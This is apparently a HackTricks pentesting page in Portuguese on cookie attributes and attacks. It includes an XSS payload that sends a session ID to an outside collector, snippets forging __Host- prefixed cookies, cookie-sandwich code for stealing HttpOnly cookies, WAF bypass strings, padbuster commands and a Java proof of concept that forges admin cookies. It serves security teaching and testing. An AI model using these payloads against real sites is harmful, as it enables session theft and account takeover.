# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Atributos do Cookie

Cookies vêm com vários atributos que controlam seu comportamento no navegador do usuário. Aqui está um resumo desses atributos em voz mais passiva:

### Expires e Max-Age

A data de expiração de um cookie é determinada pelo atributo `Expires`. Por outro lado, o atributo `Max-age` define o tempo em segundos até que um cookie seja deletado. **Prefira `Max-age`, pois reflete práticas mais modernas.**

### Domain

Os hosts que recebem um cookie são especificados pelo atributo `Domain`. Por padrão, isso é definido para o host que emitiu o cookie, não incluindo seus subdomínios. Porém, quando o atributo `Domain` é definido explicitamente, ele abrange também os subdomínios. Isso torna a especificação do atributo `Domain` uma opção menos restritiva, útil em cenários onde é necessário compartilhar cookies entre subdomínios. Por exemplo, definir `Domain=mozilla.org` torna os cookies acessíveis em subdomínios como `developer.mozilla.org`.

### Path

O atributo `Path` indica um caminho de URL específico que deve estar presente na URL solicitada para que o cabeçalho `Cookie` seja enviado. Esse atributo considera o caractere `/` como separador de diretório, permitindo correspondências também em subdiretórios.

### Regras de Ordenação

Quando dois cookies têm o mesmo nome, aquele selecionado para envio é determinado por:

- O cookie que corresponde ao path mais longo na URL solicitada.
- O cookie definido mais recentemente se os paths forem idênticos.

### SameSite

- O atributo `SameSite` determina se os cookies são enviados em requisições originadas de domínios de terceiros. Ele oferece três configurações:
- **Strict**: Restringe o envio do cookie em requisições de terceiros.
- **Lax**: Permite o envio do cookie com requisições GET iniciadas por sites de terceiros.
- **None**: Permite que o cookie seja enviado a partir de qualquer domínio de terceiros.

Lembre-se, ao configurar cookies, entender esses atributos ajuda a garantir que eles se comportem como esperado em diferentes cenários.

| **Request Type** | **Example Code**                   | **Cookies Sent When** |
| ---------------- | ---------------------------------- | --------------------- |
| Link             | \<a href="...">\</a>               | NotSet\*, Lax, None   |
| Prerender        | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None   |
| Form GET         | \<form method="GET" action="...">  | NotSet\*, Lax, None   |
| Form POST        | \<form method="POST" action="..."> | NotSet\*, None        |
| iframe           | \<iframe src="...">\</iframe>      | NotSet\*, None        |
| AJAX             | $.get("...")                       | NotSet\*, None        |
| Image            | \<img src="...">                   | NetSet\*, None        |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
Um cookie com o atributo _**SameSite**_ irá **mitigar ataques CSRF** quando uma sessão autenticada for necessária.

**\*Observe que desde o Chrome80 (feb/2019) o comportamento padrão de um cookie sem o atributo samesite** **será lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
Note que temporariamente, após aplicar essa mudança, os **cookies sem uma política SameSite** no Chrome serão **tratados como None** durante os **primeiros 2 minutos e depois como Lax para requisições POST cross-site de nível topo.**

## Flags de Cookies

### HttpOnly

Isso evita que o **client** acesse o cookie (via **Javascript**, por exemplo: `document.cookie`)

#### **Bypasses**

- Se a página estiver **enviando os cookies como a resposta** de uma requisição (por exemplo em uma página **PHPinfo**), é possível abusar de um XSS para enviar uma requisição a essa página e **roubar os cookies** da resposta (veja um exemplo em [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- Isso pode ser contornado com requisições **TRACE HTTP**, já que a resposta do servidor (se esse método HTTP estiver disponível) refletirá os cookies enviados. Essa técnica é chamada **Cross-Site Tracking**.
- Essa técnica é evitada por **navegadores modernos que não permitem enviar um TRACE** a partir de JS. Entretanto, alguns bypasses foram encontrados em software específico, como enviar `\r\nTRACE` em vez de `TRACE` para o IE6.0 SP2.
- Outra forma é a exploração de vulnerabilidades zero/day dos navegadores.
- É possível **sobrescrever cookies HttpOnly** realizando um ataque Cookie Jar overflow:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- É possível usar o ataque [**Cookie Smuggling**](#cookie-smuggling) para exfiltrar esses cookies
- Se qualquer endpoint server-side ecoar o ID de sessão bruto na resposta HTTP (por exemplo, dentro de comentários HTML ou um bloco de debug), você pode contornar o HttpOnly usando um XSS gadget para buscar esse endpoint, extrair o segredo com regex e exfiltrá-lo. Exemplo de padrão de payload XSS:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### Secure

A requisição **apenas** enviará o cookie em uma requisição HTTP se ela for transmitida por um canal seguro (tipicamente **HTTPS**).

## Prefixos de Cookies

Cookies prefixados com `__Secure-` são exigidos a serem definidos juntamente com a flag `secure` a partir de páginas que estão seguras por HTTPS.

Para cookies prefixados com `__Host-`, várias condições devem ser atendidas:

- Devem ser definidos com a flag `secure`.
- Devem originar-se de uma página segura por HTTPS.
- É proibido especificar um domain, evitando sua transmissão para subdomínios.
- O path desses cookies deve ser definido como `/`.

É importante notar que cookies prefixados com `__Host-` não podem ser enviados para superdomínios ou subdomínios. Essa restrição ajuda a isolar cookies de aplicação. Assim, empregar o prefixo `__Host-` para todos os cookies de aplicação pode ser considerado uma boa prática para aumentar segurança e isolamento.

### Sobrescrevendo cookies

Uma das proteções dos cookies prefixados com `__Host-` é evitar que sejam sobrescritos a partir de subdomínios. Evita, por exemplo, [**Cookie Tossing attacks**](cookie-tossing.md). Na palestra [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)) é apresentado que era possível definir cookies com prefixo \_\_HOST- a partir de um subdomínio, enganando o parser, por exemplo adicionando "=" no início ou no início e no fim...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ou em PHP era possível adicionar **outros caracteres no início** do nome do cookie que seriam **substituídos por underscore** characters, permitindo sobrescrever cookies `__HOST-`:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

Abuse discrepâncias entre o parsing do browser e do backend ao prefixar um code point de whitespace Unicode no nome do cookie. O browser não considerará que o nome começa literalmente com `__Host-`/`__Secure-`, então permite definir a partir de um subdomínio. Se o backend trim/normalizar o whitespace Unicode inicial nas chaves dos cookies, ele verá o nome protegido e pode sobrescrever o cookie de alto privilégio.

- PoC de um subdomínio que pode definir cookies do domínio pai:
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- Comportamento típico do backend que possibilita o problema:
- Frameworks that trim/normalize cookie keys. In Django, Python’s `str.strip()` removes a wide range of Unicode whitespace code points, causing the name to normalize to `__Host-name`.
- Code points comumente aparados incluem: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- Muitos frameworks resolvem nomes de cookie duplicados como “last wins”, então o valor de cookie normalizado controlado pelo atacante sobrescreve o legítimo.

- Diferenças entre navegadores importam:
- Safari bloqueia espaços em branco Unicode multibyte em nomes de cookie (por exemplo, rejeita U+2000) mas ainda permite os de um único byte U+0085 e U+00A0, que muitos backends apararam. Faça testes cruzados entre navegadores.

- Impacto: Permite sobrescrever cookies `__Host-`/`__Secure-` a partir de contextos menos confiáveis (subdomínios), o que pode levar a XSS (se refletido), CSRF token override, e session fixation.

- Exemplo On-the-wire vs visão do servidor (U+2000 presente no nome):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
Muitos backends split/parse e depois trim, resultando no `__Host-name` normalizado assumindo o valor do atacante.

#### Legacy `$Version=1` cookie splitting on Java backends (prefix bypass)

Algumas stacks Java (por exemplo, Tomcat/Jetty-style) ainda habilitam o parsing legado RFC 2109/2965 quando o header `Cookie` começa com `$Version=1`. Isso pode fazer o servidor reinterpretar uma única string de cookie como múltiplos cookies lógicos e aceitar uma entrada forjada `__Host-` que originalmente foi definida a partir de um subdomínio ou mesmo de uma origem insegura.

- PoC forcing legacy parsing:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- Por que funciona:
- As verificações de prefixo no lado do cliente aplicam-se durante o set, mas o parsing legadodo lado do servidor depois divide e normaliza o header, contornando a intenção das garantias de prefixo `__Host-`/`__Secure-`.

- Onde testar: Tomcat, Jetty, Undertow, ou frameworks que ainda honram os atributos RFC 2109/2965. Combine com semântica de overwrite por nomes duplicados.

#### Primitiva de sobrescrita last-wins para nomes duplicados

Quando dois cookies normalizam para o mesmo nome, muitos backends (incluindo Django) usam a última ocorrência. Depois que smuggling/legacy-splitting produz dois nomes `__Host-*`, o controlado pelo atacante normalmente vence.

#### Detecção e ferramentas

Use o Burp Suite para testar essas condições:

- Tente múltiplos code points de whitespace Unicode no início: U+2000, U+0085, U+00A0 e observe se o backend trima/remova espaços e trata o nome como com prefixo.
- Envie `$Version=1` primeiro no header Cookie e verifique se o backend realiza legacy splitting/normalization.
- Observe a resolução de nomes duplicados (first vs last wins) injetando dois cookies que normalizam para o mesmo nome.
- Burp Custom Action para automatizar isto: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Dica: Essas técnicas exploram a lacuna octet-vs-string do RFC 6265: browsers enviam bytes; servers decodificam e podem normalizar/remover espaços. Discrepâncias na decodificação e normalização são o cerne do bypass.

## Ataques com Cookies

Se um cookie customizado contiver dados sensíveis, verifique-o (especialmente se você estiver num CTF), pois pode ser vulnerável.

### Decodificação e Manipulação de Cookies

Dados sensíveis embutidos em cookies devem sempre ser examinados. Cookies codificados em Base64 ou formatos similares frequentemente podem ser decodificados. Essa vulnerabilidade permite que atacantes alterem o conteúdo do cookie e se façam passar por outros usuários ao codificar novamente seus dados modificados no cookie.

### Session Hijacking

Esse ataque envolve roubar o cookie de um usuário para obter acesso não autorizado à sua conta em uma aplicação. Ao usar o cookie roubado, o atacante pode se passar pelo usuário legítimo.

### Session Fixation

Nesse cenário, um atacante engana a vítima para que use um cookie específico ao fazer login. Se a aplicação não atribuir um novo cookie no login, o atacante, possuindo o cookie original, pode se passar pela vítima. Essa técnica depende da vítima entrar usando um cookie fornecido pelo atacante.

Se você encontrou um **XSS em um subdomínio** ou você **controla um subdomínio**, leia:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

Aqui, o atacante convence a vítima a usar o cookie de sessão do atacante. A vítima, acreditando estar conectada em sua própria conta, inadvertidamente executará ações no contexto da conta do atacante.

Se você encontrou um **XSS em um subdomínio** ou você **controla um subdomínio**, leia:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

Clique no link anterior para acessar uma página que explica possíveis falhas em JWT.

JSON Web Tokens (JWT) usados em cookies também podem apresentar vulnerabilidades. Para informações detalhadas sobre potenciais falhas e como explorá-las, recomenda-se acessar o documento linkado sobre hacking JWT.

### Cross-Site Request Forgery (CSRF)

Esse ataque força um usuário autenticado a executar ações indesejadas em uma aplicação web na qual ele está autenticado. Atacantes podem explorar cookies que são enviados automaticamente com cada requisição para o site vulnerável.

### Empty Cookies

(Confira mais detalhes em [pesquisa original](https://blog.ankursundara.com/cookie-bugs/)) Navegadores permitem a criação de cookies sem nome, o que pode ser demonstrado via JavaScript da seguinte forma:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
O resultado no cabeçalho Cookie enviado é `a=v1; test value; b=v2;`. Intrigantemente, isso permite a manipulação de cookies se for definido um cookie com nome vazio, potencialmente controlando outros cookies ao definir o cookie vazio para um valor específico:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
Isso faz com que o navegador envie um cabeçalho de cookie interpretado por todos os servidores web como um cookie chamado `a` com o valor `b`.

#### Bug do Chrome: Problema com pontos de código substitutos Unicode

No Chrome, se um ponto de código substituto Unicode fizer parte de um set cookie, `document.cookie` fica corrompido, retornando em seguida uma string vazia:
```js
document.cookie = "\ud800=meep"
```
Isso resulta em `document.cookie` retornando uma string vazia, indicando corrupção permanente.

#### Cookie Smuggling Due to Parsing Issues

(Veja mais detalhes na[original research](https://blog.ankursundara.com/cookie-bugs/)) Vários servidores web, incluindo os de Java (Jetty, TomCat, Undertow) e Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), tratam incorretamente strings de cookie devido ao suporte desatualizado ao RFC2965. Eles leem um valor de cookie entre aspas duplas como um único valor mesmo se ele incluir ponto e vírgulas, que normalmente deveriam separar pares chave-valor:
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) O parsing incorreto de cookies por servidores, notadamente Undertow, Zope e aqueles que usam Python's `http.cookie.SimpleCookie` e `http.cookie.BaseCookie`, cria oportunidades para ataques de injeção de cookies. Esses servidores não delimitam corretamente o início de novos cookies, permitindo que atacantes forjem cookies:

- Undertow espera um novo cookie imediatamente após um valor entre aspas sem um ponto e vírgula.
- Zope procura por uma vírgula para começar a parsear o próximo cookie.
- As classes de cookie do Python começam a parsear a partir de um caractere de espaço.

Essa vulnerabilidade é particularmente perigosa em aplicações web que dependem de proteção CSRF baseada em cookie, pois permite que atacantes injetem cookies falsos de token CSRF, potencialmente contornando medidas de segurança. O problema é agravado pelo tratamento de nomes de cookie duplicados no Python, onde a última ocorrência sobrescreve as anteriores. Também levanta preocupações para `__Secure-` e `__Host-` cookies em contextos inseguros e pode levar a bypasses de autorização quando cookies são passados para servidores back-end suscetíveis à falsificação.

### Cookies $version

#### WAF Bypass

According to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), it might be possible to use the cookie attribute **`$Version=1`** to make the backend use an old logic to parse the cookie due to the **RFC2109**. Moreover, other values just as **`$Domain`** and **`$Path`** can be used to modify the behaviour of the backend with the cookie.

#### Cookie Sandwich Attack

According to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) it's possible to use the cookie sandwich technique to steal HttpOnly cookies. These are the requirements and steps:

- Encontre um local onde um aparente cookie inútil é refletido na resposta
- **Crie um cookie chamado `$Version`** com valor `1` (você pode fazer isso em um ataque XSS via JS) com um path mais específico para que ele obtenha a posição inicial (alguns frameworks como Python não precisam deste passo)
- **Crie o cookie que é refletido** com um valor que deixa uma **aspas duplas aberta** e com um path específico para que ele seja posicionado no cookie db após o anterior (`$Version`)
- Então, o cookie legítimo ficará em seguida na ordem
- **Crie um dummy cookie que feche as aspas duplas** dentro do seu valor

Dessa forma o cookie vítima fica preso dentro do novo cookie version 1 e será refletido sempre que for refletido.
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF bypasses

#### Cookies $version

Verifique a seção anterior.

#### Bypassing value analysis with quoted-string encoding

Esse parsing remove o escape de valores escapados dentro dos cookies, então "\a" vira "a". Isso pode ser útil para contornar WAFS como:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

No RFC2109 é indicado que uma **vírgula pode ser usada como separador entre valores de cookie**. Também é possível adicionar **espaços e tabulações antes e depois do sinal de igual**. Portanto um cookie como `$Version=1; foo=bar, abc = qux` não gera o cookie `"foo":"bar, admin = qux"` mas os cookies `foo":"bar"` and `"admin":"qux"`. Observe como 2 cookies são gerados e como admin teve os espaços removidos antes e depois do sinal de igual.

#### Bypassing value analysis with cookie splitting

Finalmente diferentes backdoors poderiam concatenar em uma string cookies diferentes passados em cabeçalhos Cookie distintos, como em:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
O que poderia permitir bypass de um WAF, como neste exemplo:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### Verificações Extras de Cookies Vulneráveis

#### **Verificações Básicas**

- O **cookie** é o **mesmo** toda vez que você faz **login**.
- Faça logout e tente usar o mesmo cookie.
- Tente fazer login com 2 dispositivos (ou navegadores) na mesma conta usando o mesmo cookie.
- Verifique se o cookie contém alguma informação e tente modificá-lo
- Tente criar várias contas com quase o mesmo username e verifique se você consegue observar similaridades.
- Verifique a opção "**remember me**" se existir para ver como funciona. Se ela existir e puder ser vulnerável, sempre use o cookie de **remember me** sem qualquer outro cookie.
- Verifique se o cookie anterior funciona mesmo depois de você alterar a senha.

#### **Ataques avançados com cookies**

Se o cookie permanece o mesmo (ou quase) quando você faz login, isso provavelmente significa que o cookie está relacionado a algum campo da sua conta (provavelmente o username). Então você pode:

- Tente criar muitas **contas** com usernames muito **parecidos** e tente **adivinhar** como o algoritmo funciona.
- Tente **bruteforce the username**. Se o cookie salva somente como um método de autenticação para seu username, então você pode criar uma conta com username "**Bmin**" e **bruteforce** cada único **bit** do seu cookie porque um dos cookies que você tentar será o pertencente a "**admin**".
- Tente **Padding** **Oracle** (você pode decifrar o conteúdo do cookie). Use **padbuster**.

**Padding Oracle - Padbuster examples**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster fará várias tentativas e perguntará qual condição é a condição de erro (aquela que não é válida).

Então ele começará a decrypting the cookie (pode levar vários minutos)

Se o ataque tiver sido realizado com sucesso, então você poderia tentar encrypt uma string de sua escolha. Por exemplo, se você quiser **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
Esta execução fornecerá o cookie corretamente criptografado e codificado com a string **user=administrator** dentro.

**CBC-MAC**

Talvez um cookie possa ter algum valor e ser assinado usando CBC. Então, a integridade do valor é a assinatura criada usando CBC com o mesmo valor. Como é recomendado usar como IV um vetor nulo, esse tipo de verificação de integridade pode ser vulnerável.

**O ataque**

1. Obtenha a assinatura do nome de usuário **administ** = **t**
2. Obtenha a assinatura do nome de usuário **rator\x00\x00\x00 XOR t** = **t'**
3. Defina no cookie o valor **administrator+t'** (**t'** será uma assinatura válida de **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00**)

**ECB**

Se o cookie for criptografado usando ECB ele pode ser vulnerável.\
Quando você faz login o cookie que recebe tem de ser sempre o mesmo.

Como detectar e atacar:

- Crie 2 usuários com dados quase iguais (username, password, email, etc.) e tente descobrir algum padrão dentro do cookie fornecido
- Crie um usuário chamado por exemplo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" e verifique se há algum padrão no cookie (como o ECB criptografa com a mesma chave cada bloco, os mesmos bytes criptografados podem aparecer se o username for criptografado).
- Deve haver um padrão (com o tamanho do bloco usado). Assim, sabendo como um monte de "a" é criptografado você pode criar um username: "a"\*(size of the block)+"admin". Então, você poderia remover o padrão criptografado correspondente a um bloco de "a" do cookie. E você terá o cookie do username "admin".

### Static-key cookie forgery (symmetric encryption of predictable IDs)

Algumas aplicações geram cookies de autenticação criptografando apenas um valor previsível (por exemplo, o ID numérico do usuário) sob uma chave simétrica global e hard-coded, e então codificando o ciphertext (hex/base64). Se a chave for estática por produto (ou por instalação), qualquer pessoa pode forjar cookies para usuários arbitrários offline e burlar a autenticação.

How to test/forge
- Identifique o(s) cookie(s) que controlam a autenticação, e.g., COOKIEID and ADMINCOOKIEID.
- Determine a cifra/codificação. Em um caso real a aplicação usou IDEA com uma chave constante de 16-byte e retornou o ciphertext como hex.
- Verifique criptografando seu próprio ID de usuário e comparando com o cookie emitido. Se coincidir, você pode forjar cookies para qualquer ID alvo (1 frequentemente corresponde ao primeiro admin).
- Defina o valor forjado diretamente como o cookie e navegue; nenhuma credencial é necessária.

<details>
<summary>Minimal Java PoC (IDEA + hex) usado no mundo real</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>contexto (por exemplo, sessão no servidor com ID aleatório, ou adicionar propriedades anti-replay).

## Referências

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
